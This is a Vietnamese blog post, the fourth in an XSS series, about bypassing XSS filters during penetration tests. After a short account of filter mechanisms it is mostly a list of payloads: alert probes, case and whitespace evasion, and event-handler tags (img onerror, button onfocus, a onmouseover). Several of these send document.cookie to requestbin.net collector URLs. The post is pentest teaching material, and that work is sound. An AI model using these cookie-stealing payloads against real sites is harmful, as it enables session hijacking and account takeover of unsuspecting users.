---
layout: post
title: Cross Site Scripting (XSS) [Part 4] - Các phương pháp bypass filter XSS,
date: 2021-05-23 00:32:20 +0700
description: Tìm hiểu về lỗi Cross Site Scripting trên ứng dụng web - P4,
img: 2021/05/23/210523_xss_filter.jpg
fig-caption: # Add figcaption (optional)
tags: [Security, WebSecurity]
---
Trong quá trình pentest ứng dụng có thể gặp nhiều trường hợp các payload XSS bị filter, làm thế nào để có thể bypass quá trình filter đó. Bài viết này chúng ta sẽ sẽ cùng nhau trao đổi một số phương pháp để thực hiện việc này. 

>PS: Chủ đề này tôi cũng không định ngồi viết một lèo là xong, sẽ viết dần dần theo năm tháng dựa trên những kinh nghiệm của mình tích lỹ được. Do vậy lâu lâu các bạn vào ngó nha có thể có nội dung mới nha. Ok, bắt đầu thôi.

**Nhắc lại:** Các cách bypass XSS phụ thuộc vào khả năng làm sạch input (thực hiện bởi WAF hoặc Ứng dụng). Có một vài cơ chế của việc này như:
* Trả lại lỗi, loại bỏ, encode, hoặc thay thế các input không hợp lệ. 
* Một số có thể dùng blacklist hoặc whitelist các ký tự thường gặp trong payload để ngăn chặn XSS.

Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu ví quá trình filter như người bảo vệ ứng dụng web thì quá trình bypass là quá trình luồn lách để qua mặt những người bảo vệ này. Khó thể nói có công thức nào tuyệt đối mà là sự tùy cơ ứng biến cho phù hợp từng hoàn cảnh. Hãy nhớ điều này.


## Các load js nguyên thủy (Không mask) huyền thoại 
### Alert message
```<script>alert(1);</script>```

### Dùng window location
```<script>window.location="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie)</script>```

### Dùng image
```<script>new Image().src="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie);</script>```

## Các payload sử dụng mask
### Case sensitive
```<SCRIPT>alert(1);</SCRIPT>```

```<ScRipT>alert(1);</sCriPt>```
### Lọc thẻ script
* Insert thêm ký tự trình duyệt hay bỏ qua (Tab, escape)

```<script  >alert(1);</script   >```

* Không dùng thẻ script

```<img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>```

```<video src=1 onerror=alert(1)>```

```<audio src=1 onerror=alert(1)>```

```<img src=1 href=1 onerror="javascript:alert(1)"></img>```

```<audio src=1 href=1 onerror="javascript:alert(1)"></audio>```

```<video src=1 href=1 onerror="javascript:alert(1)"></video>```

```<input onblur=javascript:alert(1) autofocus><input autofocus>```

```<button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>```

```<a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>```

